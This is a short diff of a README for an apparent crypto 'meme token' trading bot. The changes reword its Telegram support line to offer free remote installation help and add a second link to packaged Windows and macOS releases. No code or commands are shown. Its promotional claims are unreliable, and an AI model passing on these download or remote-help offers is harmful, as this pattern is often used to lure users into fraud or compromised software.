@@ -33,11 +33,11 @@ Additionally, the bot handles all transactions fully automatically, which means 
 
 **Telegram Support**
 
-With our 24/7 live Telegram support service, you can instantly find answers to any questions you may have.
+If you need any help, you can send a message on [Telegram Support](https://t.me/pancakeswapprediction) 24/7 to get free full support for the installation of the bot, either remotely or with step-by-step guidance.
 
 ## [Download (Windows / macOS)](https://github.com/CryptoAiBots/Meme-Token-Hunter-Bot/releases)
 
-You can easily access our application by downloading the packaged version suitable for your operating system from the link above.
+You can easily access our application by downloading the packaged version suitable for your operating system from the link above. [Download (Windows App)](https://github.com/CryptoAiBots/Meme-Token-Hunter-Bot/releases)
 
 ## ⚡ Source Installation Way I (Recommended)
 
